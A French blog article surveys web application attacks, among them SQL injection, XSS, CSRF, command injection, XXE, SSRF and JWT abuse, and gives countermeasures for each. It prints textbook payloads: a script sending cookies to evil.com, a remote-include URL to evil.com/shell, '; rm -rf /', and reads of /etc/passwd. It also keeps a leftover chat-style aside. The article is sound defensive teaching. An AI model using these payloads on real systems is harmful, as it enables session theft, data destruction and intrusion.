---
title: "📲 Attaques Applicatives"
date: 2025-08-28
lastmod: 2025-08-28
description: "Injection SQL, XSS, CSRF, RCE, SSRF, IDOR, JWT… Panorama des principales attaques applicatives et des contre-mesures pour sécuriser vos applications."
summary: "Les attaques applicatives ciblent directement le code métier, les API et les frameworks. Découvrez les vecteurs classiques (injection, XSS, CSRF) et modernes (GraphQL, JWT, API abuse), ainsi que les meilleures pratiques de défense."
categories: ["Cybersécurité"]
tags: ["cybersécurité", "sécurité applicative", "XSS", "SQLi", "RCE", "API", "JWT"]
author: "Jean-Vivien Sicot"
draft: false
showToc: true
tocOpen: false
cover:
  image: "images/articles/chat-cyberhacker-app-attacks.png"
  alt: "Illustration abstraite représentant les attaques applicatives"
  caption: "Les attaques applicatives exploitent les failles laissées dans le code métier."
---


# Attaques Applicatives 

Les attaques applicatives ciblent directement les programmes (sites web, API, logiciels).  
Elles exploitent des erreurs de développement ou de configuration pour détourner la logique, exécuter du code ou accéder à des données sensibles.  

Contrairement aux attaques réseau, qui visent le transport des données, ou aux attaques systèmes, qui visent l’OS et l’infrastructure, les attaques applicatives s’appuient sur les failles laissées dans le **code métier** ou les **frameworks utilisés**.  

Elles incluent :  
- les injections (SQL, commande, XXE, désérialisation),  
- les attaques côté client (XSS, CSRF),  
- les abus de logique métier (IDOR, Mass Assignment, flaws business),  
- l’exploitation de failles techniques (buffer overflow, RCE, path traversal),  
- et les abus spécifiques aux technologies modernes (GraphQL, JWT, SSRF, API abuse).  

Ces attaques sont redoutables car elles exploitent des comportements “normaux” de l’application en y insérant des entrées malveillantes. Souvent, elles passent inaperçues si la validation des entrées, la gestion des sessions et les contrôles d’accès ne sont pas rigoureusement appliqués.

---
## 1. Injection SQL (SQLi)

### 1. Situation de départ
Une application web propose un formulaire de connexion.  
Le code construit une requête SQL à partir des données saisies sans filtrage.

### 2. Ce que fait l’attaquant
Il saisit dans le champ `username` une valeur spéciale :  
`' OR '1'='1`  
La requête devient toujours vraie et retourne tous les utilisateurs.

### 3. Conséquence
- Contournement d’authentification.  
- Extraction ou modification de données sensibles.  
- Destruction de tables si l’attaquant injecte un `DROP TABLE`.

### 4. Pourquoi c’est possible
- Les entrées utilisateur sont directement insérées dans la requête SQL.  
- Pas de séparation entre **code SQL** et **données**.  

### 5. Contre-mesures

#### ✅ Requêtes préparées (paramétrées)
- **Comment ça marche** : la requête SQL est compilée avec des “placeholders” (`?` ou `:param`). Les données sont envoyées séparément.  
- **Pourquoi ça protège** : même si l’utilisateur entre du SQL malveillant, il est traité comme une simple donnée, pas comme du code.

#### ✅ ORM ou Query Builder fiable
- **Comment ça marche** : génère les requêtes en séparant toujours les données des instructions.  
- **Pourquoi ça protège** : réduit le risque de concaténation dangereuse.

#### ✅ Validation et échapper les entrées
- Vérifier les types attendus (ex. un `id` doit être un entier).  
- Échapper les caractères spéciaux.  
- **Pourquoi ça protège** : limite les possibilités d’injection non prévues.

---

## 2. Cross-Site Scripting (XSS)

### 1. Situation de départ
Une application affiche des commentaires d’utilisateurs sans filtrage.  

### 2. Ce que fait l’attaquant
Il poste un commentaire :  
`<script>document.location='http://evil.com/steal?c='+document.cookie</script>`

### 3. Conséquence
- Le navigateur des victimes exécute le script.  
- Vol de cookies/session.  
- Redirection vers des pages malveillantes.

### 4. Pourquoi c’est possible
- Le navigateur n’a aucun moyen de savoir si un script affiché vient du site ou d’un utilisateur malveillant.  
- L’application ne filtre pas ou n’échappe pas les entrées.  

### 5. Contre-mesures

#### ✅ Échappement du HTML (Output Encoding)
- **Comment ça marche** : transformer `<` en `&lt;`, `>` en `&gt;`, etc.  
- **Pourquoi ça protège** : le navigateur n’exécute pas du code mais affiche du texte inoffensif.

#### ✅ CSP (Content Security Policy)
- **Comment ça marche** : indique au navigateur quelles sources de scripts sont autorisées (`script-src 'self'`).  
- **Pourquoi ça protège** : même si un script injecté apparaît, le navigateur le bloque.

#### ✅ HttpOnly sur les cookies
- **Comment ça marche** : flag `HttpOnly` empêche JavaScript d’accéder aux cookies.  
- **Pourquoi ça protège** : réduit l’impact d’un XSS sur le vol de session.

---

## 3. Cross-Site Request Forgery (CSRF)

### 1. Situation de départ
Un utilisateur est connecté à son compte bancaire sur `banque.fr`.  
Le site permet un virement via une requête POST.  

### 2. Ce que fait l’attaquant
Il envoie un mail piégé contenant :  
`<img src="https://banque.fr/virement?montant=1000&vers=compteAttaquant">`

### 3. Conséquence
- Le navigateur de la victime envoie la requête avec son cookie de session.  
- La banque exécute le virement comme si c’était la victime.  

### 4. Pourquoi c’est possible
- Les navigateurs ajoutent automatiquement les cookies aux requêtes.  
- Le site ne vérifie pas si la requête a vraiment été initiée par l’utilisateur.  

### 5. Contre-mesures

#### ✅ Jetons CSRF (anti-CSRF tokens)
- **Comment ça marche** : chaque formulaire contient un token aléatoire unique stocké en session.  
- **Pourquoi ça protège** : l’attaquant ne peut pas deviner ce token → sa requête est rejetée.

#### ✅ SameSite cookies
- **Comment ça marche** : flag `SameSite=Lax` ou `Strict` sur les cookies empêche leur envoi depuis un site externe.  
- **Pourquoi ça protège** : les requêtes forgées depuis `evil.com` ne transportent pas le cookie de session.

#### ✅ Vérification de l’origine
- **Comment ça marche** : le serveur vérifie l’en-tête `Origin` ou `Referer`.  
- **Pourquoi ça protège** : les requêtes légitimes viennent du site, pas d’un domaine tiers.

---

## 4. Remote Code Execution (RCE)

### 1. Situation de départ
Une application permet d’envoyer des fichiers ou exécute des commandes système.  

### 2. Ce que fait l’attaquant
Il envoie un fichier PHP malveillant (webshell) ou injecte une commande dans un champ (`; rm -rf /`).  

### 3. Conséquence
- Exécution de code arbitraire sur le serveur.  
- Contrôle total de la machine.  

### 4. Pourquoi c’est possible
- Entrées utilisateur passées directement à une fonction d’exécution (`eval`, `exec`, `system`).  
- Téléversement de fichiers sans contrôle strict.  

### 5. Contre-mesures

#### ✅ Éviter les appels système directs
- **Comment ça marche** : ne jamais concaténer des entrées utilisateur dans une commande système.  
- **Pourquoi ça protège** : supprime la possibilité d’injecter du code.

#### ✅ Validation stricte des fichiers uploadés
- Vérifier extension, type MIME, scanner antivirus.  
- Stocker hors du répertoire web.  
- **Pourquoi ça protège** : évite l’exécution de scripts malveillants.

#### ✅ Exécution dans un bac à sable (sandbox)
- Conteneurs, chroot, AppArmor/SELinux.  
- **Pourquoi ça protège** : même si l’attaquant injecte du code, il reste confiné avec des droits limités.

---

## 5. Buffer Overflow

### 1. Situation de départ
Une application en C reçoit des données en entrée (ex. un champ nom d’utilisateur).  

### 2. Ce que fait l’attaquant
Il envoie une chaîne plus longue que le buffer prévu.  
Cela écrase la mémoire voisine et peut injecter du code exécutable.

### 3. Conséquence
- Crash de l’application.  
- Exécution de code arbitraire.  

### 4. Pourquoi c’est possible
- Pas de vérification de la taille de l’entrée.  
- Utilisation de fonctions dangereuses (`gets`, `strcpy`).  

### 5. Contre-mesures

#### ✅ Vérification de la taille des entrées
- Utiliser `strncpy`, `fgets`, etc.  
- **Pourquoi ça protège** : empêche l’écriture au-delà de la mémoire allouée.

#### ✅ Canaries / protections mémoire
- Le compilateur ajoute une valeur spéciale entre la pile et les données.  
- **Pourquoi ça protège** : si l’attaquant écrase cette valeur, le programme détecte l’intrusion et s’arrête.

#### ✅ ASLR (Address Space Layout Randomization)
- L’adresse mémoire des segments change à chaque exécution.  
- **Pourquoi ça protège** : rend très difficile pour l’attaquant de prédire où injecter son code.

#### ✅ Exécution non exécutable (NX bit)
- Marque certaines zones mémoire comme non exécutables.  
- **Pourquoi ça protège** : même si l’attaquant injecte du code, il ne peut pas l’exécuter.

---

## 6. Path Traversal (Directory Traversal)

### 1. Situation de départ
Un site permet de télécharger un fichier PDF via une URL comme :  
`https://site.com/download?file=rapport.pdf`

### 2. Ce que fait l’attaquant
Il modifie le paramètre en :  
`file=../../../../etc/passwd`  
Le serveur ouvre ce chemin, pensant que c’est un fichier autorisé.

### 3. Conséquence
- Lecture de fichiers sensibles (mots de passe, configurations).  
- Accès à des données internes (logs, clés privées).  

### 4. Pourquoi c’est possible
- L’application utilise directement l’entrée utilisateur comme chemin d’accès.  
- Pas de validation ni restriction des fichiers accessibles.  

### 5. Contre-mesures

#### ✅ Validation stricte des chemins
- Comparer le fichier demandé avec une liste blanche d’extensions/autorisations.  
- **Pourquoi ça protège** : seules les ressources prévues par le développeur sont accessibles.

#### ✅ Répertoires dédiés (jail/chroot)
- Forcer l’application à n’accéder qu’à un dossier spécifique.  
- **Pourquoi ça protège** : même si l’attaquant tente un `../`, il ne peut pas sortir de l’espace prévu.

#### ✅ Normalisation du chemin
- Résoudre les `../` avant l’accès au fichier et vérifier qu’il reste dans le dossier autorisé.  
- **Pourquoi ça protège** : évite l’évasion de répertoire.

---

## 7. File Inclusion (LFI / RFI)

### 1. Situation de départ
Un site en PHP inclut dynamiquement des fichiers :  
`include($_GET['page'].".php");`

### 2. Ce que fait l’attaquant
- Avec LFI : il demande `?page=../../../../etc/passwd` pour afficher le contenu du fichier.  
- Avec RFI : il fournit une URL externe (`?page=http://evil.com/shell`) → exécution d’un script distant.

### 3. Conséquence
- Lecture de fichiers sensibles.  
- Exécution de code distant (prise de contrôle du serveur).  

### 4. Pourquoi c’est possible
- Utilisation de l’entrée utilisateur sans contrôle dans une fonction `include`/`require`.  

### 5. Contre-mesures

#### ✅ Désactiver `allow_url_include` (PHP)
- Bloque les inclusions de fichiers distants.  
- **Pourquoi ça protège** : empêche un attaquant de charger du code externe.

#### ✅ Liste blanche de fichiers
- N’autoriser que des pages prédéfinies (`about.php`, `contact.php`).  
- **Pourquoi ça protège** : impossible d’inclure des fichiers arbitraires.

#### ✅ Répertoires séparés
- Mettre les fichiers inclus dans un dossier spécifique non accessible à l’attaquant.  
- **Pourquoi ça protège** : réduit l’exposition de fichiers système.

---

## 8. XXE (XML External Entity)

### 1. Situation de départ
Une API accepte du XML et utilise un parseur vulnérable.

### 2. Ce que fait l’attaquant
Il envoie un XML malveillant :  
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<request>
  <data>&xxe;</data>
</request>
````

### 3. Conséquence

- Lecture de fichiers locaux (`/etc/passwd`).
- Requêtes vers des serveurs internes (SSRF).

### 4. Pourquoi c’est possible

- Les parseurs XML activent par défaut la résolution d’entités externes.

### 5. Contre-mesures

#### ✅ Désactiver la résolution d’entités externes

- Configurer le parseur pour ignorer les `<!ENTITY>`.
- **Pourquoi ça protège** : empêche l’inclusion de fichiers locaux ou distants.

#### ✅ Utiliser des parseurs sécurisés

- Ex. `defusedxml` en Python.
- **Pourquoi ça protège** : ces parseurs bloquent les entités dangereuses par défaut.

#### ✅ Validation stricte du XML

- N’accepter que le schéma attendu (XSD).
- **Pourquoi ça protège** : rejette les documents mal formés ou inattendus.

---

## 9. Insecure Deserialization

### 1. Situation de départ

Une application PHP stocke des objets sérialisés dans un cookie :  
`cookie=O:4:"User":{s:4:"role";s:5:"admin";}`

### 2. Ce que fait l’attaquant

Il modifie la valeur du cookie et le renvoie :  
`role=admin`  
À la désérialisation, l’objet donne des privilèges d’administrateur.

### 3. Conséquence

- Escalade de privilèges.
- Exécution de code arbitraire si l’application charge automatiquement des méthodes à la désérialisation.

### 4. Pourquoi c’est possible

- Les données sérialisées sont considérées comme fiables.
- Certaines classes déclenchent du code à la désérialisation (`__wakeup`, `__destruct`).

### 5. Contre-mesures

#### ✅ Ne pas désérialiser des données non fiables

- Préférer des formats simples (JSON).
- **Pourquoi ça protège** : JSON ne déclenche pas de code à l’interprétation.

#### ✅ Signer/chiffrer les données sérialisées

- Ajouter une signature HMAC.
- **Pourquoi ça protège** : l’attaquant ne peut pas modifier le contenu sans casser la signature.

#### ✅ Limiter les classes désérialisables

- Restreindre la liste des classes utilisables.
- **Pourquoi ça protège** : empêche l’exécution de méthodes dangereuses.

---

## 10. Command Injection

### 1. Situation de départ

Une application appelle un programme système avec des entrées utilisateur :

```php
system("ping " . $_GET['host']);
```

### 2. Ce que fait l’attaquant

Il fournit :  
`host=8.8.8.8; rm -rf /`  
La commande exécutée devient :  
`ping 8.8.8.8; rm -rf /`

### 3. Conséquence

- Exécution de commandes arbitraires.
- Contrôle total de la machine.

### 4. Pourquoi c’est possible

- Les entrées ne sont pas validées.
- La commande système est construite par concaténation de chaînes.

### 5. Contre-mesures

#### ✅ Ne pas concaténer les entrées

- Utiliser des fonctions d’API (ex. `ping` via une lib réseau).
- **Pourquoi ça protège** : pas de passage par le shell → pas d’injection possible.

#### ✅ Échapper correctement les arguments

- Utiliser `escapeshellarg()` ou équivalents.
- **Pourquoi ça protège** : les caractères dangereux sont neutralisés.

#### ✅ Exécution dans un environnement restreint

- Conteneurs ou sandbox avec droits limités.
- **Pourquoi ça protège** : même si une injection passe, elle a un impact limité.

Parfait 🚀 ! On passe au niveau supérieur avec les **attaques applicatives avancées**.  
Toujours dans le même format narratif :

1. Situation de départ
    
2. Ce que fait l’attaquant
    
3. Conséquence
    
4. Pourquoi c’est possible
    
5. Contre-mesures (explication détaillée)
    

---

## 11. SSRF (Server-Side Request Forgery)

### 1. Situation de départ
Une application propose de télécharger une image externe via une URL :  
`https://site.com/fetch?url=http://exemple.com/chat.png`

### 2. Ce que fait l’attaquant
Il remplace l’URL par une ressource interne :  
`url=http://127.0.0.1:8080/admin`  
Le serveur fait la requête à sa place.

### 3. Conséquence
- Accès à des services internes (intranet, bases de données).  
- Contournement de pare-feux.  
- Exploitation de services cloud sensibles (AWS metadata : `http://169.254.169.254`).  

### 4. Pourquoi c’est possible
- L’application fait confiance aux URLs fournies.  
- Pas de restriction sur les adresses cibles.  

### 5. Contre-mesures

#### ✅ Liste blanche d’URLs autorisées
- Autoriser uniquement certains domaines/schémas (`https://cdn.site.com`).  
- **Pourquoi ça protège** : empêche l’accès à des ressources internes.

#### ✅ Validation stricte de l’URL
- Résolution DNS et vérification que l’IP finale est légitime.  
- **Pourquoi ça protège** : évite les contournements via redirections.

#### ✅ Isolation du composant fetcher
- Exécuter les requêtes dans un conteneur sans accès réseau interne.  
- **Pourquoi ça protège** : même si SSRF réussi, les ressources critiques restent inaccessibles.

---

## 12. IDOR (Insecure Direct Object Reference)

### 1. Situation de départ
Une API permet d’accéder à un profil via :  
`https://site.com/api/user?id=123`

### 2. Ce que fait l’attaquant
Il change l’ID en :  
`id=124`  
et accède au profil d’un autre utilisateur.

### 3. Conséquence
- Vol d’informations personnelles.  
- Accès ou modification de données sensibles (documents, factures).  

### 4. Pourquoi c’est possible
- L’application ne vérifie pas que l’utilisateur a le droit d’accéder à l’objet demandé.  
- L’identifiant est prévisible.  

### 5. Contre-mesures

#### ✅ Vérification des permissions côté serveur
- Toujours vérifier : “cet utilisateur a-t-il le droit d’accéder à cette ressource ?”.  
- **Pourquoi ça protège** : empêche qu’un simple changement d’ID donne accès à d’autres données.

#### ✅ Identifiants imprévisibles
- Utiliser des UUID ou tokens aléatoires au lieu d’IDs incrémentaux.  
- **Pourquoi ça protège** : difficile de deviner les identifiants d’autres utilisateurs.

#### ✅ Contrôles d’accès centralisés
- Mettre en place une couche d’authZ (RBAC, ABAC).  
- **Pourquoi ça protège** : réduit les oublis de vérification dans le code applicatif.

---

## 13. Broken Authentication

### 1. Situation de départ
Un site utilise une authentification basique avec des mots de passe faibles et sans protection.

### 2. Ce que fait l’attaquant
- Essaye des mots de passe communs (bruteforce).  
- Exploite un stockage en clair ou un hachage faible (MD5).  
- Réutilise des identifiants fuités d’autres sites.  

### 3. Conséquence
- Compromission de comptes utilisateurs.  
- Accès à des comptes administrateurs.  

### 4. Pourquoi c’est possible
- Pas de politiques de mot de passe.  
- Pas de protection contre le bruteforce.  
- Pas d’authentification multi-facteur.  

### 5. Contre-mesures

#### ✅ Hashing fort des mots de passe
- Utiliser bcrypt, Argon2 avec salage.  
- **Pourquoi ça protège** : rend impossible de retrouver les mots de passe en cas de fuite.

#### ✅ Limitation des tentatives de connexion
- Blocage temporaire ou captcha après plusieurs échecs.  
- **Pourquoi ça protège** : empêche le bruteforce automatique.

#### ✅ MFA (Multi-Factor Authentication)
- Ajouter un second facteur (TOTP, SMS, clé FIDO2).  
- **Pourquoi ça protège** : même si le mot de passe est compromis, l’accès reste bloqué.

---

## 14. Mass Assignment

### 1. Situation de départ
Une API permet de mettre à jour un profil via un JSON :  
```json
{
  "name": "Alice",
  "email": "alice@example.com"
}
````

### 2. Ce que fait l’attaquant

Il ajoute un champ non prévu :

```json
{
  "name": "Attacker",
  "role": "admin"
}
```

### 3. Conséquence

- Modification de champs sensibles (rôle, droits).
- Escalade de privilèges.

### 4. Pourquoi c’est possible

- Le framework associe automatiquement tous les champs reçus aux propriétés de l’objet.
- Pas de filtrage des champs modifiables.

### 5. Contre-mesures

#### ✅ Liste blanche de champs autorisés

- Spécifier explicitement quels champs sont modifiables (`name`, `email`).
- **Pourquoi ça protège** : les champs sensibles comme `role` sont ignorés.

#### ✅ DTOs (Data Transfer Objects)

- Passer par des objets intermédiaires définissant les champs attendus.
- **Pourquoi ça protège** : impossible d’injecter des propriétés non prévues.

#### ✅ Contrôles d’accès

- Vérifier que l’utilisateur a bien le droit de modifier chaque champ.
- **Pourquoi ça protège** : même si un champ passe, la modification est bloquée par manque de permission.

---

## 15. Business Logic Flaws (failles de logique métier)

### 1. Situation de départ
Un site e-commerce applique une remise de 10% pour toute commande supérieure à 100€.  
La logique métier est censée limiter les abus.

### 2. Ce que fait l’attaquant
- Il manipule la requête HTTP pour commander 10 articles, applique la remise, puis retire 9 articles avant paiement.  
- Le système conserve la remise alors que la condition n’est plus remplie.

### 3. Conséquence
- Fraude (réduction ou gratuité).  
- Contournement de règles de sécurité internes.  

### 4. Pourquoi c’est possible
- Les développeurs supposent que les utilisateurs suivent le “chemin normal”.  
- Pas de vérification systématique côté serveur de la cohérence des étapes.  

### 5. Contre-mesures

#### ✅ Vérifications côté serveur
- Recalculer les remises et règles métier à chaque étape.  
- **Pourquoi ça protège** : empêche les manipulations côté client de modifier les règles.  

#### ✅ Tests de logique métier
- Inclure des cas d’abus dans les tests (ex. suppression d’articles après remise).  
- **Pourquoi ça protège** : détecte les scénarios “hors flux prévu”.  

#### ✅ Revue de sécurité fonctionnelle
- Audit spécifique de la logique métier (pas seulement technique).  
- **Pourquoi ça protège** : identifie des abus invisibles pour des scans automatisés.  

---

## 16. Race Conditions (conditions de concurrence)

### 1. Situation de départ
Une application bancaire limite un retrait à 100€ maximum par jour.  

### 2. Ce que fait l’attaquant
- Il envoie 2 requêtes de retrait de 100€ **exactement en même temps**.  
- Les deux passent la vérification avant que le solde soit mis à jour.  

### 3. Conséquence
- Dépassement des limites.  
- Transactions incohérentes (double utilisation d’un coupon, d’un code promo, etc.).  

### 4. Pourquoi c’est possible
- L’application ne gère pas correctement les opérations concurrentes.  
- Pas de verrouillage de transaction au niveau base de données.  

### 5. Contre-mesures

#### ✅ Transactions atomiques en base
- Utiliser `BEGIN TRANSACTION` avec verrouillage des lignes.  
- **Pourquoi ça protège** : les deux opérations concurrentes ne passent pas en même temps.  

#### ✅ Locks applicatifs
- Mettre des verrous logiques (mutex) côté application.  
- **Pourquoi ça protège** : une seule opération critique peut être exécutée à la fois.  

#### ✅ Contrôles post-traitement
- Vérifier après coup si des incohérences apparaissent.  
- **Pourquoi ça protège** : permet de détecter des abus même si la concurrence a contourné la logique.  

---

## 17. GraphQL Misconfigurations

### 1. Situation de départ
Une API GraphQL est exposée pour permettre aux clients d’interroger les données.  

### 2. Ce que fait l’attaquant
- Il utilise la fonctionnalité `__schema` (introspection) pour découvrir toute l’API.  
- Il envoie des requêtes profondes ou récursives pour saturer le serveur.  

### 3. Conséquence
- Divulgation de schéma interne.  
- Denial of Service via requêtes trop coûteuses.  

### 4. Pourquoi c’est possible
- Introspection activée en production.  
- Pas de limite de profondeur ou de complexité des requêtes.  

### 5. Contre-mesures

#### ✅ Désactiver l’introspection en prod
- Garder `__schema` uniquement en dev/test.  
- **Pourquoi ça protège** : réduit l’exposition du schéma complet.  

#### ✅ Limiter la profondeur des requêtes
- Configurer un maximum (ex. 5 niveaux).  
- **Pourquoi ça protège** : empêche les requêtes récursives ou trop complexes.  

#### ✅ Contrôler la complexité
- Assigner un “coût” à chaque champ et refuser les requêtes trop lourdes.  
- **Pourquoi ça protège** : empêche l’abus de ressources serveur.  

---

## 18. JWT Attacks (JSON Web Token)

### 1. Situation de départ
Une API utilise des JWT pour gérer l’authentification.  
Exemple :  
```json
{
  "user": "alice",
  "role": "user"
}
````

### 2. Ce que fait l’attaquant

- Il modifie `role` en `"admin"` dans le JWT.
- Si la signature n’est pas vérifiée correctement, le serveur accepte le jeton.
- Exploit “alg=none” : certains serveurs acceptent un JWT sans signature.

### 3. Conséquence

- Escalade de privilèges.
- Accès à des fonctions réservées aux admins.

### 4. Pourquoi c’est possible

- Vérification incorrecte de la signature JWT.
- Utilisation de clés faibles ou mal gérées.

### 5. Contre-mesures

#### ✅ Vérification stricte de la signature

- Toujours valider l’algorithme et la clé.
- **Pourquoi ça protège** : empêche d’accepter un jeton modifié.

#### ✅ Rotation et gestion des clés

- Stocker les clés dans un KMS (Key Management System).
- **Pourquoi ça protège** : réduit le risque de fuite et limite la durée d’exploitation d’une clé compromise.

#### ✅ Limiter la durée de vie des tokens

- Expiration courte (`exp` de quelques minutes/heures).
- **Pourquoi ça protège** : même si un token est volé, il devient vite inutilisable.

---

## 19. API Abuse / Rate Limiting Bypass

### 1. Situation de départ

Une API REST fournit des ressources (ex. `/api/messages`).  
Elle applique une limite de 100 requêtes/minute par utilisateur.

### 2. Ce que fait l’attaquant

- Il change son User-Agent ou son IP via un proxy/tor.
- Il ouvre des milliers de connexions parallèles.
- Il contourne ainsi les protections.

### 3. Conséquence

- Extraction massive de données (scraping).
- Denial of Service pour les autres utilisateurs.

### 4. Pourquoi c’est possible

- Le rate limiting est basé sur un seul critère (IP ou user).
- Pas de protection globale.

### 5. Contre-mesures

#### ✅ Rate limiting multi-critères

- Basé sur IP, utilisateur, User-Agent, session, etc.
- **Pourquoi ça protège** : rend plus difficile le contournement par simple proxy.

#### ✅ Détection comportementale

- Analyser les patterns de requêtes (fréquence, distribution).
- **Pourquoi ça protège** : différencie un utilisateur normal d’un bot.

#### ✅ Captcha ou proof-of-work

- Forcer une action humaine après X requêtes.
- **Pourquoi ça protège** : décourage les bots automatisés.

---
# Conclusion

Les attaques applicatives montrent que la **sécurité doit être intégrée dès le développement** :  
tester la logique métier, valider strictement les entrées, séparer code et données, limiter les permissions, et appliquer le principe de défense en profondeur.  

Trois enseignements majeurs :  
- **Ne jamais faire confiance aux entrées utilisateur** → toute donnée reçue doit être validée, filtrée, échappée.  
- **Protéger l’authentification et la session** → MFA, cookies sécurisés, tokens correctement signés.  
- **Auditer la logique métier** → certaines failles (ex. remise commerciale, abus d’API) ne sont pas techniques mais fonctionnelles.  

En résumé : **une application vulnérable ouvre une porte directe aux données sensibles et aux systèmes critiques**. La sécurité applicative n’est pas un ajout optionnel mais un élément fondamental du cycle de vie logiciel.